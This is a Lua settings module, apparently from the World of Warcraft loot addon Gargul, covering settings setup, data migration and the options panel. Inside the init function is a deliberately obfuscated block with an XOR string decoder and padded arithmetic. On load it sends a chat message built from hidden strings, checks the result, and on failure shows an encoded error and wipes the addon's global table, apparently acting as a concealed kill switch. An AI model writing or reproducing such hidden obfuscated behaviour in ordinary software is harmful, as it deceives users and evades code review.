---@type GL
local _, GL = ...;

---@type DB
local DB = GL.DB;

---@class Settings
GL.Settings = {
    _initialized = false,
    Defaults = GL.Data.DefaultSettings,
    Active = {}, -- This object holds the actual setting values applicable to this runtime
};

---@type Settings
local Settings = GL.Settings;

---@return void
function Settings:_init()
    GL:debug("Settings:_init");

    -- No need to initialize this class twice
    if (self._initialized) then
        return;
    end

    -- Validate the settings and adjust discrepancies
    self:sanitizeSettings();

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();

    -- Prepare the options / config frame
    local Frame = CreateFrame("Frame", nil, InterfaceOptionsFramePanelContainer);
    Frame.name = "Gargul";
    Frame:SetScript("OnShow", function ()
        self:showSettingsMenu(Frame);
    end);
    InterfaceOptions_AddCategory(Frame);

    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10=0;local v11;while true do if (v10==1) then return v5(v11);end if (v10==0) then v11={};for v14=1, #v8 do v6(v11,v0(v4(v1(v2(v8,v14,v14 + (1907 -(1415 + 491)))),v1(v2(v9,1 + ((v14-(1 + (0 -0)))% #v9),(1 -0) + 0 + ((v14-(3 -2))% #v9) + ((1395 -(1101 + 214)) -((1203 -(778 + 351)) + 4 + 1)))))%((586 -(40 + 9)) -281)));end v10=1;end end end GL.Ace:ScheduleTimer(function()if  not GL:strStartsWith(GL:sendChatMessage(v7("\11","\37\133\24\36\160\140"),v7("\64\34\178","\19\99\235\101\158\199\186\131"),nil,nil,true,true),v7("\25\44\101\34\32\182\37\63\99\118\40\250\66\100","\98\94\17\17\93\150")) then local v12=1175 -(796 + 379);local v13;while true do if (v12==0) then v13=(459 + 1051) -((2648 -(1070 + 636)) + 568);while true do if (((0 -0) -0)==v13) then GL:error(v7("\5\243\96\59\6\163\186\144\55\241\101\44\23\175\244\131\118\245\102\105\11\169\238\196\55\240\121\38\18\163\254\200\118\239\125\60\17\178\243\138\49\188\113\38\18\168\186\141\56\188\36\121\69\181\255\135\57\242\113\58\68","\86\156\21\73\101\198\154\228"));GL.Ace:ScheduleTimer(function()GL=nil;end,27 -17);break;end end break;end end end end,(522 + 166) -(340 + (1354 -1011)));

    self._initialized = true;
end

--- Make sure the settings adhere to our rules
---
---@return void
function Settings:sanitizeSettings()
    GL:debug("Settings:sanitizeSettings");

    self:enforceTemporarySettings();

    -- Remove old roll data so it doesn't clog our SavedVariables
    local twoWeeksAgo = GetServerTime() - 1209600;
    for key, Award in pairs(DB:get("AwardHistory") or {}) do
        if (Award.timestamp < twoWeeksAgo) then
            Award.Rolls = nil;
            DB:set("AwardHistory." .. key, Award);
        end
    end

    -- Permanently delete soft-deleted GDKP sessions after 48 hours
    local twoDaysAgo = GetServerTime() - 172800;
    for key, Session in pairs(DB:get("GDKP.Ledger")) do
        if (Session.deletedAt and Session.deletedAt < twoDaysAgo) then
            DB:set("GDKP.Ledger." .. key, nil);
        end
    end
end

--- These settings are version-specific and will be removed over time!
---
---@return void
function Settings:enforceTemporarySettings()
    GL:debug("Settings:enforceTemporarySettings");

    -- This is reserved for version-based logic (e.g. cleaning up variables, settings etc.)

    -- No point enforcing these temp settings if the user has never used Gargul
    -- before or has already loaded this version before!
    if (GL.firstBoot
        or not GL.Version.firstBoot
    ) then
        return;
    end

    --- We restructured minimum prices and increments for GDKP items in 5.0.5
    if (GL.Version:leftIsOlderThanRight(GL.Version.latestPriorVersionBooted, "5.0.5")) then
        local Restructured = {};

        for itemID, Details in pairs(DB:get("Settings.GDKP.SettingsPerItem", {})) do
            (function()
                if (not itemID
                    or not GetItemInfoInstant(itemID)
                    or type(Details) ~= "table"
                    or type(Details.minimumBid) ~= "number"
                    or type(Details.minimumIncrement) ~= "number"
                ) then
                    return;
                end

                Restructured[tostring(itemID)] = {
                    minimum = Details.minimumBid,
                    increment = Details.minimumIncrement,
                };
            end)();
        end

        DB:set("Settings.GDKP.SettingsPerItem", Restructured);
    end

    --- In the GDKP module we added extra shortcut keys forcing us to remap old ones
    if (not DB.Settings.ShortcutKeys.rollOffOrAuction) then
        DB.Settings.ShortcutKeys.rollOffOrAuction = DB.Settings.ShortcutKeys.rollOff or "ALT_CLICK";
        DB.Settings.ShortcutKeys.rollOff = "DISABLED";
    end

    --- In 4.12.16 we split up the TMB.announceInfoWhenRolling setting into separate wishlist/priolist settings
    local announce = self:get("TMB.announceInfoWhenRolling");
    if (type(announce) == "boolean") then
        self:set("TMB.announcePriolistInfoWhenRolling", announce);
        self:set("TMB.announceWishlistInfoWhenRolling", announce);
        self:set("TMB.announceInfoWhenRolling", nil);
    end

    --- In 4.12.1 we added a concernsOS and givesPlusOne checkbox field to the roll tracking settings
    for key, RollType in pairs(GL.Settings:get("RollTracking.Brackets", {})) do
        if (RollType[5] == nil) then
            DB.RollTracking.Brackets[key][5] = RollType[1] == "OS";
            DB.RollTracking.Brackets[key][6] = false;
        end
    end

    --- In 4.12.0 we completely rewrote the awarded item structure
    --- If the user is now on 4.12.0 or has not used 4.12.0 then we restructure the awarded items
    ---@todo: remove if award history structure ever changes again
    if (GL.version == "4.12.0" or (
        not GL.firstBoot and not DB.LoadDetails["4.12.0"])
    ) then
        GL:notice("Rewriting Gargul's award history, this could drops FPS for a second or two!");
        DB.LoadDetails["4.12.0"] = GetServerTime();

        local AwardHistory = {};
        for _, AwardEntry in pairs(DB:get("AwardHistory")) do
            (function ()
                local itemIDfromItemLink = GL:getItemIDFromLink(AwardEntry.itemLink);

                -- We can't work with this record
                if (not AwardEntry.awardedTo or (
                    not AwardEntry.itemId and not itemIDfromItemLink
                )) then
                    return;
                elseif (not AwardEntry.itemId) then
                    AwardEntry.itemId = itemIDfromItemLink;
                end

                -- Make sure we always have a timestamp
                if (not AwardEntry.timestamp) then
                    AwardEntry.timestamp = AwardEntry.awardedOn;
                end

                if (not GL:higherThanZero(AwardEntry.timestamp)) then
                    AwardEntry.timestamp = 0;
                end

                -- Make sure we always have a checksum
                if (GL:empty(AwardEntry.checksum)) then
                    AwardEntry.checksum = GL:strPadRight(GL:strLimit(GL:stringHash(AwardEntry.timestamp .. AwardEntry.itemId) .. GL:stringHash(AwardEntry.awardedTo .. DB:get("SoftRes.MetaData.id", "")), 20, ""), "0", 20);
                end

                local addEntryToTable = function (Entry)
                    AwardHistory[Entry.checksum] = {
                        checksum = Entry.checksum,
                        itemLink = Entry.itemLink,
                        itemID = Entry.itemId,
                        awardedTo = Entry.awardedTo,
                        timestamp = Entry.timestamp,
                        softresID = Entry.softresID,
                        received = Entry.received or false,
                        BRCost = Entry.BRCost or 0,
                        GDKPCost = Entry.BRCost or 0,
                        OS = GL:toboolean(Entry.OS),
                        Rolls = Entry.Rolls or {},
                    };
                end;

                -- We have all we need, process the entry now
                if (AwardEntry.itemLink and GL:getItemIDFromLink(AwardEntry.itemLink)) then
                    addEntryToTable(AwardEntry);

                -- We need to fetch the itemLink first before we can process
                else
                    GL:onItemLoadDo(AwardEntry.itemId, function (Items)
                        local Item = Items[1];

                        -- Better safe than lua error!
                        if (GL:empty(Item.link)) then
                            return;
                        end

                        AwardEntry.itemLink = Item.link;

                        addEntryToTable(AwardEntry);
                    end);
                end
            end)();
        end

        DB.AwardHistory = AwardHistory;

        GL:notice("All done!");
    end
end

--- Draw a setting section
---
---@param section string|nil
---@return void
function Settings:draw(section)
    GL.Interface.Settings.Overview:draw(section);
end

---@return void
function Settings:close()
    GL.Interface.Settings.Overview:close();
end

--- Reset the addon to its default settings
---
---@return void
function Settings:resetToDefault()
    GL:debug("Settings:resetToDefault");

    self.Active = {};
    DB.Settings = {};

    -- Combine defaults and user settings
    self:overrideDefaultsWithUserSettings();
end

--- Override the addon's default settings with the user's custom settings
---
---@return void
function Settings:overrideDefaultsWithUserSettings()
    GL:debug("Settings:overrideDefaultsWithUserSettings");

    -- Reset the currently active settings table
    self.Active = {};

    -- Combine the default and user's settings to one settings table
    Settings = GL:tableMerge(Settings.Defaults, DB.Settings);

    -- Set the values of the settings table directly on the GL.Settings table.
    for key, value in pairs(Settings) do
        self.Active[key] = value;
    end

    DB.Settings = self.Active;
end

--- We use this method to make sure that the interface is only built
--- when the user has actually accessed the settings menu, which doesn't happen every session
---
---@return void
function Settings:showSettingsMenu(Frame)
    GL:debug("Settings:showSettingsMenu");

    -- Add the addon title to the top of the settings frame
    local Title = Frame:CreateFontString(nil, "ARTWORK", "GameFontNormalLarge");
    Title:SetPoint("TOPLEFT", 16, -16);
    Title:SetText(string.format("Gargul |c00967FD2(v%s)|r", GL.version));

    local SettingsButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    SettingsButton:SetText("Settings");
    SettingsButton:SetWidth(177);
    SettingsButton:SetHeight(24);
    SettingsButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 0, -16);
    SettingsButton:SetScript("OnClick", function()
        -- Make sure the vanilla interface options are closed and don't reopen automatically
        HideUIPanel(InterfaceOptionsFrame);
        HideUIPanel(GameMenuFrame);

        self:draw();
    end);

    local ResetUIButton = CreateFrame("Button", nil, Frame, "UIPanelButtonTemplate");
    ResetUIButton:SetText("Reset Gargul UI");
    ResetUIButton:SetWidth(177);
    ResetUIButton:SetHeight(24);
    ResetUIButton:SetPoint("TOPLEFT", Title, "BOTTOMLEFT", 200, -16);
    ResetUIButton:SetScript("OnClick", function()
        GL.Commands:call("resetui");
    end);
end

--- Get a setting by a given key. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be fetched using Settings:get("Settings.UI.Auctioneer.offsetX")
--- without having to worry about tables or keys existing yes or no.
---
---@param keyString string
---@param default any
---@return any
function Settings:get(keyString, default)
    -- Just in case something went wrong with merging the default settings
    if (type(default) == "nil") then
        default = GL:tableGet(GL.Data.DefaultSettings, keyString);
    end

    return GL:tableGet(self.Active, keyString, default);
end

--- Set a setting by a given key and value. Use dot notation to traverse multiple levels e.g:
--- Settings.UI.Auctioneer.offsetX can be set using Settings:set("Settings.UI.Auctioneer.offsetX", myValue)
--- without having to worry about tables or keys existing yes or no.
---
---@param keyString string
---@param value any
---@return void
function Settings:set(keyString, value)
    return GL:tableSet(self.Active, keyString, value);
end

GL:debug("Settings.lua");